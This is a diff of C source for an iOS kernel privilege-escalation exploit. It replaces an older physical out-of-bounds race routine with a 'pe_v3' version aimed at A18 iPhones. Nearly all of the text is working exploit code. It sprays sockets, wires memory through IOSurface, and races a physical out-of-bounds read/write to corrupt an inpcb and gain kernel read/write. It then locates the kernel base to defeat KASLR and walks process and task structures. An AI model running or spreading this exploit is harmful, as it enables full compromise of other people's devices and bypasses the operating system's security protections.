@@ -5,6 +5,7 @@
 #include <pthread.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 #include "free_thread.h"
 #include "kmem.h"
@@ -17,276 +18,390 @@
 offsets_t g_offsets;
 pe_context_t g_ctx;
 
-kern_return_t pe_init(void) {
-    // creates read and write fd
-    init_target_file();
-    if (g_ctx.executable_name == NULL) {
-        uint32_t size = 0x1024;
-        char* executable_path = calloc(1, size);
-        _NSGetExecutablePath(executable_path, &size);
-        char* executable_name = strrchr(executable_path, '/');
-        if (executable_name != NULL) {
-            executable_name = executable_name + 1;
-        } else {
-            executable_name = executable_path;
-        }
-        // save our executable name, since it's the oracle for inpcb
-        g_ctx.executable_name = strdup(executable_name);
-        free(executable_path);
-    }
+// A18 pe_v3 ported from kolbicz/Cyanide commit 13ad360b3e7d2ec4bfe0c4a703cc85a6cea46e71.
+#define PE_V3_WIRED_BYTES (2ULL * 1024 * 1024 * 1024)
+#define PE_V3_SEARCH_PAGES 0x800ULL
+#define PE_V3_MIN_WIRED_PAGES 4096
+#define PE_V3_MLOCK_FAILURE_LIMIT 64
+#define PE_V3_SEARCH_SURFACE_RESERVE 2048
+#define PE_V3_MAX_FIXED_ALLOC_PROBES (1U << 20)
+#define PE_V3_MAX_FREED_PAGES 64
+#define PE_V3_BATCH_PAGES 8
+#define PE_V3_BATCH_ROUNDS 3
+#define PE_V3_PROVEN_CYCLES 20
+#define PE_V3_FOREIGN_READ_LIMIT 20
+#define PE_V3_MIN_SOCKETS_PER_PAGE 128
+#define PE_V3_SETTLE_SECONDS 3
+#define PE_V3_DEALLOC_PACE 2048
 
-    // original allocs 1 page, we don't need that much
-    g_ctx.shared = calloc(1, sizeof(free_thread_shared_t));
-    // create the free thread
-    pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared);
-    g_ctx.free_thread_started = true;
+static bool g_pe_v3_hunt_budget_hit;
 
-    LOG("free_thread_shared: %p", g_ctx.shared);
-    return KERN_SUCCESS;
-}
-
-kern_return_t pe_v1(void) {
-    // 0x1000 pages
-    uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
-    // if (g_ctx.is_a18_devices) {
-    //     n_of_total_search_mapping_pages = 0x10 * 0x10;
-    // }
-
-    // 0x8000000 -> 128 mib
-    uint64_t search_mapping_size = 0x2000 * vm_page_size;
-    // if (g_ctx.is_a18_devices) {
-    //     search_mapping_size = (0x10 * vm_page_size) / 4;
-    // }
-
-    // 0x40000000 -> 1gib
-    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;
-
-    // 8
-    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;
-
-    // 0xf00
-    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
-    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);
-
-    // creates physically contiguous mapping in purple gfx mem and sets marker on it
-    // 2 pages since first one is "in bounds" and the second one will be replaced with
-    // a non-contiguous page in the race (hopefully)
-    uint64_t contiguous_mapping_size = 2 * vm_page_size;
-    initialize_physical_read_write(contiguous_mapping_size);
-
-    // commenting this out since it's only for A18
-
-    /*
-    mach_vm_address_t wired_mapping = 0;
-    mach_vm_size_t wired_mapping_size = 0xC0000000;  // original is 3 * 1024 * 1024 * 1024
-    if (g_ctx.is_a18_devices) {
-        kern_return_t kr = mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
-        if (kr != KERN_SUCCESS) {
-            free(read_buffer);
-            free(write_buffer);
-            return kr;
-        }
-        LOG("wired_mapping: %#llx", wired_mapping);
-    }
-    */
-
-    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
-    size_t target_inp_gencnt_count = 0;
-
-    while (true) {
-        // again, only for A18
-        /*
-        if (g_ctx.is_a18_devices) {
-            surface_mlock(wired_mapping, wired_mapping_size);
-            for (uint64_t s = 0; s < (wired_mapping_size / vm_page_size); s++) {
-                memcpy((void*)(wired_mapping + s * vm_page_size), &(uint64_t){0}, sizeof(uint64_t));
-            }
-        }
-        */
-
-        mach_vm_address_t search_mappings[n_of_search_mappings];
-        size_t search_mappings_count = 0;
-        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
-            mach_vm_address_t search_mapping_address = 0;
-            // allocate 128mb * number of search mappings
-            // these allocations are NOT contiguous
-            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-            if (kr != KERN_SUCCESS) {
-                free(read_buffer);
-                free(write_buffer);
-                return kr;
-            }
-
-            // place marker on start of each page
-            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
-                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
-            }
-
-            // save the address of the mapping onto the search mappings array
-            search_mappings[search_mappings_count++] = search_mapping_address;
-        }
-
-        g_ctx.socket_ports_count = 0;
-
-        uint64_t open_max = MAX_OPEN_FDS;  // bsd/sys/syslimits.h
-        uint64_t maxfiles = 3 * open_max;  // bsd/conf/param.c
-        uint64_t leeway = 4096 * 2;        // I have no idea
-        // maxfiles - leeway = 22528 -> 0x5800 aka MAX_SOCKETS_COUNT, why
-        // this limit seems arbitrary?
-        // spray sockets, save pcb gencnt
-        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
-            uint64_t port = spray_socket();
-            if (port == UINT64_MAX) {
-                LOG("failed to spray sockets: %#lx", g_ctx.socket_ports_count);
-                break;
-            }
-        }
-
-        // these are the start and end pcb gencnts
-        // they are allocated in incrementing order
-        uint64_t start_pcb_id = g_ctx.socket_pcb_ids[0];
-        uint64_t end_pcb_id = g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
-        LOG("socket_ports_count: %#lx", g_ctx.socket_ports_count);
-        LOG("start_pcb_id: %#llx", start_pcb_id);
-        LOG("end_pcb_id: %#llx", end_pcb_id);
-
-        bool success = false;
-        // 8 search mappings
-        for (size_t s = 0; s < search_mappings_count; s++) {
-            mach_vm_address_t search_mapping_address = search_mappings[s];
-            LOG("looking in search mapping: %lu", s);
-
-            memory_object_size_t memory_object_size = search_mapping_size;
-            mach_port_t memory_object = MACH_PORT_NULL;
-            // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
-            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
-            if (kr != KERN_SUCCESS) {
-                free(read_buffer);
-                free(write_buffer);
-                return kr;
-            }
-
-            // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
-            surface_mlock(search_mapping_address, search_mapping_size);
-
-            // start the party
-            uint64_t seeking_offset = 0;
-
-            // seeking offset increases by page_size, until search_mapping_size
-            // since search_mapping_size is 0x8000000, we can loop 0x2000 times
-            LOG_DEBUG("search mapping size %#llx", search_mapping_size);
-            // NOTE:
-            // fix mach_vm_map err on free thread, we'd try to map outside memory object
-            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
-                // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
-                // oob_size -> 0xf00, oob_offset -> 0x100
-                kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
-                if (kr == KERN_SUCCESS) {
-                    // LOG_DEBUG("Finding and corrupting socket...");
-                    if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
-                        success = true;
-                        break;
-                    }
-                }
-                seeking_offset += vm_page_size;
-            }
-
-            // NOTE:
-            // I don't think this will do anything worth
-            // since I've never had a success pass first mapping
-            // unless when we never find target, this would
-            // help with memory pressure?
-            // surface_munlock(search_mapping_address);
-            kr = mach_port_deallocate(mach_task_self(), memory_object);
-            if (kr != KERN_SUCCESS) {
-                free(read_buffer);
-                free(write_buffer);
-                return kr;
-            }
-
-            if (success) {
-                break;
-            }
-        }
-
-        // deallocate fileport_makeport sockets
-        // at this point the target sockets are already back to being fd
-        sockets_release();
-
-        // deallocate search mappings
-        while (search_mappings_count > 0) {
-            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
-            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
-        }
-
-        // if (g_ctx.is_a18_devices) {
-        //     surface_munlock(wired_mapping);
-        // }
-
-        if (success) {
-            break;
-        }
-    }
-
-    free(read_buffer);
-    free(write_buffer);
-    return KERN_SUCCESS;
-}
-
-kern_return_t pe(void) {
-    char* device_machine = get_device_machine();
-    // kern_return_t kr = KERN_SUCCESS;
-
-    // I didn't add support for pe_v2, I don't have a test device
-    if (strstr(device_machine, "iPhone17,") != NULL) {
-        // LOG("running on A18 devices");
-        // g_ctx.is_a18_devices = true;
-        // sleep(8);
-        // pe_init();
-        // pe_v2();
+static kern_return_t stop_early_krw(const char* reason) {
+    LOG_ERR("%s", reason);
+    bool parked = krw_park_transport();
+    bool pinned = parked && krw_sockets_leak_forever();
+    g_ctx.transport_unsafe = true;
+    if (parked && pinned) {
+        LOG_ERR("KRW transport parked and pinned; reboot before retrying");
     } else {
-        LOG("running on non-A18 devices");
-        pe_init();
-        pe_v1();
+        LOG_ERR("KRW transport could not be secured; reboot now");
     }
+    return KERN_FAILURE;
+}
 
-    // not going to fix typo to keep it close to original
-    LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
-    LOG("success_read_count: %llu", g_ctx.success_read_count);
-
-    // cleanup
-    atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
+static void pe_stop_free_thread(void) {
+    if (!g_ctx.free_thread_started) return;
+    atomic_store_explicit(&g_ctx.shared->stop_sync, 1, memory_order_seq_cst);
+    atomic_store_explicit(&g_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
+    atomic_store_explicit(&g_ctx.shared->go_sync, 1, memory_order_seq_cst);
     atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
     pthread_join(g_ctx.free_thread, NULL);
+    g_ctx.free_thread_started = false;
+}
 
-    // we have stable rw, we can close the fds now
-    close(g_ctx.write_fd);
-    close(g_ctx.read_fd);
-    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + 0x20);
+static kern_return_t pe_init(void) {
+    init_target_file();
+    if (g_ctx.read_fd < 0 || g_ctx.write_fd < 0) return KERN_FAILURE;
 
-    // we may need to tweak this for different ios versions
-    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + 0x38);
-    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
-    uint64_t zv_name = early_kread64(ipi_zone + 0x10);
+    uint32_t size = 0x1024;
+    char* executable_path = calloc(1, size);
+    if (executable_path == NULL) return KERN_RESOURCE_SHORTAGE;
+    if (_NSGetExecutablePath(executable_path, &size) != 0) {
+        free(executable_path);
+        return KERN_FAILURE;
+    }
+    char* executable_name = strrchr(executable_path, '/');
+    g_ctx.executable_name = strdup(executable_name ? executable_name + 1 : executable_path);
+    free(executable_path);
+    if (g_ctx.executable_name == NULL) return KERN_RESOURCE_SHORTAGE;
 
-    uint64_t kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
-    while (true) {
-        if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
-            // tweak this for 15 and below
-            uint64_t hdr = early_kread64(kernel_base + 0x8);
-            // filetype and cpusubtype
-            if (hdr == 0xc00000002 || hdr == 0xB00000000) {
+    g_ctx.shared = calloc(1, sizeof(*g_ctx.shared));
+    if (g_ctx.shared == NULL) return KERN_RESOURCE_SHORTAGE;
+    if (pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared) != 0) {
+        return KERN_FAILURE;
+    }
+    g_ctx.free_thread_started = true;
+    return KERN_SUCCESS;
+}
+
+static size_t spray_socket_batch(size_t limit) {
+    size_t before = g_ctx.socket_ports_count;
+    while (g_ctx.socket_ports_count < limit) {
+        if (spray_socket() == UINT64_MAX) break;
+    }
+    return g_ctx.socket_ports_count - before;
+}
+
+static bool scan_proven_batch(mach_port_t memory_object, const mach_vm_offset_t* offsets, size_t count, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t* target_ids, size_t* target_count,
+                              uint64_t* attempts) {
+    for (unsigned round = 0; round < PE_V3_BATCH_ROUNDS; round++) {
+        for (size_t idx = 0; idx < count; idx++) {
+            (*attempts)++;
+            if (find_and_corrupt_socket(memory_object, offsets[idx], read_buffer, write_buffer, target_ids, target_count, true) == KERN_SUCCESS) {
+                return true;
+            }
+            if (g_ctx.race_failed) return false;
+        }
+        if (g_ctx.socket_ports_count >= MAX_SOCKETS_COUNT) break;
+        size_t limit = g_ctx.socket_ports_count + MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES;
+        if (limit > MAX_SOCKETS_COUNT) limit = MAX_SOCKETS_COUNT;
+        if (spray_socket_batch(limit) == 0) break;
+    }
+    return false;
+}
+
+static bool cycle_proven_pages(mach_port_t memory_object, const mach_vm_offset_t* offsets, size_t count, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t* target_ids, size_t* target_count,
+                               uint64_t* attempts, uint64_t* cycles) {
+    for (unsigned cycle = 0; cycle < PE_V3_PROVEN_CYCLES; cycle++) {
+        (*cycles)++;
+        LOG("pe_v3 reoccupation cycle %u/%u", cycle + 1, PE_V3_PROVEN_CYCLES);
+        sockets_release();
+        *target_count = 0;
+        sleep(PE_V3_SETTLE_SECONDS);
+        if (g_ctx.race_failed) break;
+        if (spray_socket_batch(MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES) == 0) break;
+
+        for (size_t base = 0; base < count; base += PE_V3_BATCH_PAGES) {
+            size_t batch_count = count - base;
+            if (batch_count > PE_V3_BATCH_PAGES) batch_count = PE_V3_BATCH_PAGES;
+            if (scan_proven_batch(memory_object, offsets + base, batch_count, read_buffer, write_buffer, target_ids, target_count, attempts)) {
+                return true;
+            }
+            if (g_ctx.race_failed) return false;
+        }
+    }
+    return false;
+}
+
+static bool pe_v3(void) {
+    g_pe_v3_hunt_budget_hit = false;
+    bool acquired = false;
+    bool socket_spray_failed = false;
+    bool search_surface_locked = false;
+    mach_port_t memory_object = MACH_PORT_NULL;
+    mach_vm_address_t search_mapping = 0;
+    mach_vm_size_t search_size = PE_V3_SEARCH_PAGES * vm_page_size;
+    mach_vm_size_t page_size = vm_page_size;
+    uint64_t page_count = PE_V3_WIRED_BYTES / page_size;
+    uint64_t wired_count = 0;
+    uint64_t wired_successes = 0;
+    uint64_t consecutive_mlock_failures = 0;
+    uint64_t hunt_reads = 0;
+    uint64_t hunt_own = 0;
+    uint64_t freed_pages = 0;
+    uint64_t reoccupy_attempts = 0;
+    uint64_t cycles = 0;
+    size_t target_count = 0;
+
+    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
+    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);
+    mach_vm_address_t* wired_addrs = calloc(page_count, sizeof(*wired_addrs));
+    mach_vm_address_t* seen_pages = calloc(4096, sizeof(*seen_pages));
+    uint64_t* target_ids = calloc(MAX_SOCKETS_COUNT, sizeof(*target_ids));
+    if (!read_buffer || !write_buffer || !wired_addrs || !seen_pages || !target_ids) {
+        LOG_ERR("pe_v3 allocation failed");
+        goto cleanup;
+    }
+
+    if (g_ctx.pc_object == MACH_PORT_NULL && initialize_physical_read_write(g_ctx.n_of_oob_pages * vm_page_size) != KERN_SUCCESS) {
+        goto cleanup;
+    }
+
+    LOG("pe_v3 staging %llu pages", page_count);
+    mach_vm_address_t wired_addr = 0;
+    bool mlock_ceiling = false;
+    for (uint64_t idx = 0; idx < page_count; idx++) {
+        kern_return_t kr;
+        if (idx == 0) {
+            kr = mach_vm_allocate(mach_task_self(), &wired_addr, page_size, VM_FLAGS_ANYWHERE);
+        } else {
+            mach_vm_address_t next = wired_addrs[idx - 1] + page_size;
+            kr = KERN_FAILURE;
+            for (unsigned probe = 0; probe < PE_V3_MAX_FIXED_ALLOC_PROBES; probe++) {
+                wired_addr = next;
+                kr = mach_vm_allocate(mach_task_self(), &wired_addr, page_size, VM_FLAGS_FIXED);
+                next += page_size;
+                if (kr == KERN_SUCCESS) break;
+            }
+        }
+        if (kr != KERN_SUCCESS) break;
+
+        wired_addrs[idx] = wired_addr;
+        wired_count = idx + 1;
+        if (!mlock_ceiling) {
+            if (surface_mlock(wired_addr, page_size) == KERN_SUCCESS) {
+                wired_successes++;
+                consecutive_mlock_failures = 0;
+            } else if (++consecutive_mlock_failures >= PE_V3_MLOCK_FAILURE_LIMIT) {
+                mlock_ceiling = true;
+            }
+        }
+        *(uint64_t*)wired_addr = g_ctx.wired_page_marker;
+        *(uint64_t*)(wired_addr + sizeof(uint64_t)) = wired_addr;
+    }
+    LOG("pe_v3 staged %llu/%llu pages; %llu IOSurface-wired", wired_count, page_count, wired_successes);
+    if (wired_successes < PE_V3_MIN_WIRED_PAGES) {
+        LOG_ERR("pe_v3 needs at least %u wired pages", PE_V3_MIN_WIRED_PAGES);
+        goto cleanup;
+    }
+
+    if (mach_vm_allocate(mach_task_self(), &search_mapping, search_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR) != KERN_SUCCESS) {
+        goto cleanup;
+    }
+    for (mach_vm_size_t offset = 0; offset < search_size; offset += page_size) {
+        *(uint64_t*)(search_mapping + offset) = g_ctx.random_marker;
+    }
+    if (surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
+        size_t released = surface_release_oldest(PE_V3_SEARCH_SURFACE_RESERVE);
+        LOG("released %zu staging surfaces for the search mapping", released);
+        if (released == 0 || surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
+            LOG_ERR("could not wire the search mapping");
+            goto cleanup;
+        }
+    }
+    search_surface_locked = true;
+
+    memory_object_size_t object_size = search_size;
+    if (mach_make_memory_entry_64(mach_task_self(), &object_size, search_mapping, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL) != KERN_SUCCESS) {
+        goto cleanup;
+    }
+
+    if (spray_socket() == UINT64_MAX) {
+        socket_spray_failed = true;
+        goto cleanup;
+    }
+    sockets_release();
+
+    size_t seen_count = 0;
+    mach_vm_offset_t batch_offsets[PE_V3_BATCH_PAGES] = {};
+    mach_vm_offset_t proven_offsets[PE_V3_MAX_FREED_PAGES] = {};
+    size_t batch_count = 0;
+    size_t proven_count = 0;
+
+    for (mach_vm_offset_t offset = 0; offset + g_ctx.pc_size <= search_size; offset += page_size) {
+        if (hunt_reads - hunt_own >= PE_V3_FOREIGN_READ_LIMIT) {
+            g_pe_v3_hunt_budget_hit = true;
+            break;
+        }
+        if (physical_oob_read_mo(memory_object, offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer) != KERN_SUCCESS) {
+            if (g_ctx.race_failed) {
+                socket_spray_failed = true;
+                break;
+            }
+            continue;
+        }
+        hunt_reads++;
+
+        if (*(uint64_t*)read_buffer != g_ctx.wired_page_marker) {
+            kern_return_t kr = find_and_corrupt_socket(memory_object, offset, read_buffer, write_buffer, target_ids, &target_count, false);
+            if (kr == KERN_SUCCESS) {
+                acquired = true;
+                break;
+            }
+            if (g_ctx.race_failed) {
+                socket_spray_failed = true;
+                break;
+            }
+            continue;
+        }
+
+        hunt_own++;
+        mach_vm_address_t wired_page = *(uint64_t*)(read_buffer + sizeof(uint64_t));
+        bool duplicate = false;
+        for (size_t idx = 0; idx < seen_count; idx++) {
+            if (seen_pages[idx] == wired_page) {
+                duplicate = true;
                 break;
             }
         }
-        kernel_base -= vm_page_size;
+        if (duplicate) continue;
+        if (seen_count < 4096) seen_pages[seen_count++] = wired_page;
+        if (freed_pages >= PE_V3_MAX_FREED_PAGES) break;
+
+        size_t tracked_idx = 0;
+        while (tracked_idx < wired_count && wired_addrs[tracked_idx] != wired_page) {
+            tracked_idx++;
+        }
+        if (tracked_idx == wired_count) continue;
+
+        *(uint64_t*)wired_page = 0;
+        *(uint64_t*)(wired_page + sizeof(uint64_t)) = 0;
+        if (mach_vm_deallocate(mach_task_self(), wired_page, page_size) != KERN_SUCCESS) {
+            continue;
+        }
+        wired_addrs[tracked_idx] = wired_addrs[--wired_count];
+        freed_pages++;
+
+        size_t before = g_ctx.socket_ports_count;
+        size_t limit = before + MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES;
+        if (limit > MAX_SOCKETS_COUNT) limit = MAX_SOCKETS_COUNT;
+        size_t added = spray_socket_batch(limit);
+        if (added < PE_V3_MIN_SOCKETS_PER_PAGE) {
+            socket_spray_failed = true;
+            break;
+        }
+
+        batch_offsets[batch_count++] = offset;
+        proven_offsets[proven_count++] = offset;
+        if (batch_count < PE_V3_BATCH_PAGES) continue;
+        if (scan_proven_batch(memory_object, batch_offsets, batch_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts)) {
+            acquired = true;
+            break;
+        }
+        if (g_ctx.race_failed) {
+            socket_spray_failed = true;
+            break;
+        }
+        batch_count = 0;
+        if (g_ctx.socket_ports_count >= MAX_SOCKETS_COUNT) break;
     }
 
-    g_ctx.kernel_base = kernel_base;
-    g_ctx.kernel_slide = kernel_base - 0xfffffff007004000;
+    if (!acquired && !socket_spray_failed && batch_count > 0) {
+        acquired = scan_proven_batch(memory_object, batch_offsets, batch_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts);
+        if (g_ctx.race_failed) socket_spray_failed = true;
+    }
+    if (!acquired && !socket_spray_failed && proven_count > 0 && hunt_reads - hunt_own <= PE_V3_FOREIGN_READ_LIMIT) {
+        acquired = cycle_proven_pages(memory_object, proven_offsets, proven_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts, &cycles);
+    }
 
-    // real cleanup
-    krw_sockets_leak_forever();
+cleanup:
+    if (memory_object != MACH_PORT_NULL) {
+        mach_port_deallocate(mach_task_self(), memory_object);
+    }
+    if (!g_ctx.transport_unsafe) sockets_release();
+    if (search_surface_locked) surface_munlock(search_mapping);
+    if (search_mapping != 0) {
+        mach_vm_deallocate(mach_task_self(), search_mapping, search_size);
+    }
+    for (uint64_t idx = 0; idx < wired_count; idx++) {
+        mach_vm_deallocate(mach_task_self(), wired_addrs[idx], page_size);
+        if ((idx + 1) % PE_V3_DEALLOC_PACE == 0) usleep(1000);
+    }
+    surface_munlock_all();
+    free(target_ids);
+    free(seen_pages);
+    free(wired_addrs);
+    free(write_buffer);
+    free(read_buffer);
+    LOG("pe_v3 result=%s hunt_reads=%llu own=%llu freed=%llu attempts=%llu cycles=%llu", acquired ? "acquired" : "miss", hunt_reads, hunt_own, freed_pages, reoccupy_attempts, cycles);
+    return acquired;
+}
+
+static kern_return_t pe(void) {
+    kern_return_t kr = pe_init();
+    if (kr != KERN_SUCCESS) return kr;
+
+    bool acquired = pe_v3();
+    if (!acquired && g_pe_v3_hunt_budget_hit && !g_ctx.race_failed) {
+        LOG("pe_v3 hit the foreign-read cap; re-rolling one fresh layout");
+        acquired = pe_v3();
+    }
+    pe_stop_free_thread();
+    physical_oob_cleanup();
+    close(g_ctx.write_fd);
+    close(g_ctx.read_fd);
+    g_ctx.write_fd = -1;
+    g_ctx.read_fd = -1;
+    if (!acquired) return KERN_FAILURE;
+
+    uint64_t pcbinfo = 0;
+    uint64_t zone = 0;
+    uint64_t zone_name = 0;
+    if (!krw_is_kernel_address(g_ctx.control_socket_pcb) || !early_kread64_checked(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_pcbinfo, &pcbinfo) || !krw_is_kernel_address(pcbinfo) ||
+        !early_kread64_checked(pcbinfo + g_ctx.offsets.inpcbinfo_ipi_zone, &zone) || !krw_is_kernel_address(zone) || !early_kread64_checked(zone + g_ctx.offsets.zone_view_name, &zone_name) ||
+        !krw_is_kernel_address(zone_name)) {
+        return stop_early_krw("post-acquisition pointer walk failed");
+    }
+    uint64_t kernel_base = zone_name & ~(uint64_t)(vm_page_size - 1);
+    if (!krw_is_kernel_address(kernel_base)) return stop_early_krw("kernel scan start is invalid");
+
+    bool found = false;
+    for (uint64_t page = 0; page < 0x10000; page++, kernel_base -= vm_page_size) {
+        uint64_t magic = 0;
+        if (!krw_is_kernel_address(kernel_base) || !early_kread64_checked(kernel_base, &magic)) {
+            return stop_early_krw("kernel base scan read failed");
+        }
+        if (magic == 0x100000cfeedfacf) {
+            uint64_t header = 0;
+            if (!early_kread64_checked(kernel_base + 8, &header)) return stop_early_krw("kernel header read failed");
+            if (header == 0xc00000002 || header == 0xb00000000) {
+                found = true;
+                break;
+            }
+        }
+    }
+    if (!found) return stop_early_krw("kernel base scan exhausted");
+
+    g_ctx.kernel_base = kernel_base;
+    g_ctx.kernel_slide = kernel_base - 0xfffffff007004000ULL;
+
+    uint64_t self_proc = find_self_proc();
+    uint64_t self_task = task_from_proc(self_proc);
+    uint64_t self_pmap = pmap_from_task(self_task);
+    if (!self_proc || !self_task || !self_pmap) return stop_early_krw("kernel object traversal failed");
+
+    LOG("self_proc=%#llx self_task=%#llx self_pmap=%#llx", self_proc, self_task, self_pmap);
+    if (!krw_sockets_leak_forever()) return stop_early_krw("could not pin KRW sockets");
     return KERN_SUCCESS;
 }
 
@@ -297,57 +412,45 @@ int clearsword_run(void) {
 
     memset(&g_offsets, 0, sizeof(g_offsets));
     memset(&g_ctx, 0, sizeof(g_ctx));
-    // 2 pages
+    g_ctx.read_fd = -1;
+    g_ctx.write_fd = -1;
+    g_ctx.control_socket = -1;
+    g_ctx.rw_socket = -1;
     g_ctx.target_file_size = vm_page_size * 2;
     g_ctx.oob_offset = 0x100;
     g_ctx.oob_size = 0xf00;
     g_ctx.n_of_oob_pages = 2;
+    g_ctx.oob_race_max_tries = 4000;
 
     arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
     arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));
-
     g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
+    if (!g_ctx.default_file_content) goto failure;
     memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);
 
-    // size of read is 32 bytes
-    g_ctx.getsockopt_read_data = calloc(1, 32);
-    int ret = 0;
-
-    if (offsets_init() != 0) {
-        LOG_ERR("offsets_init failed");
-        ret = -1;
-        goto cleanup;
-    }
+    if (offsets_init() != 0) goto failure;
     g_ctx.offsets = g_offsets;
+    if (pe() != KERN_SUCCESS) goto failure;
 
-    kern_return_t kr = pe();
-    if (kr != KERN_SUCCESS) {
-        LOG_ERR("pe failed: %s (%d)", mach_error_string(kr), kr);
-        ret = kr;
-        goto cleanup;
-    }
-
+    double elapsed_ms = (double)(mach_absolute_time() - start) * timebase.numer / timebase.denom / 1e6;
     LOG("kernel_base: %#llx", g_ctx.kernel_base);
     LOG("kernel_slide: %#llx", g_ctx.kernel_slide);
+    LOG("KRW acquired in %.3f ms", elapsed_ms);
 
-    uint64_t end = mach_absolute_time();
-    uint64_t elapsed = end - start;
-    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
-    LOG("Time taken for KRW: %.3f ms", elapsed_ms);
-
-    // NOTE:
-    // This is not part of the original exploit
-    uint64_t self_proc = find_self_proc();
-    LOG("self_proc: %#llx", self_proc);
-    uint64_t self_task = task_from_proc(self_proc);
-    LOG("self_task: %#llx", self_task);
-    uint64_t self_pmap = pmap_from_task(self_task);
-    LOG("self_pmap: %#llx", self_pmap);
-
-cleanup:
     free(g_ctx.shared);
     free(g_ctx.default_file_content);
-    free(g_ctx.getsockopt_read_data);
     free(g_ctx.executable_name);
-    return ret;
+    return 0;
+
+failure:
+    pe_stop_free_thread();
+    physical_oob_cleanup();
+    surface_munlock_all();
+    if (!g_ctx.transport_unsafe) sockets_release();
+    if (g_ctx.write_fd >= 0) close(g_ctx.write_fd);
+    if (g_ctx.read_fd >= 0) close(g_ctx.read_fd);
+    free(g_ctx.shared);
+    free(g_ctx.default_file_content);
+    free(g_ctx.executable_name);
+    return g_ctx.transport_unsafe ? -2 : -1;
 }
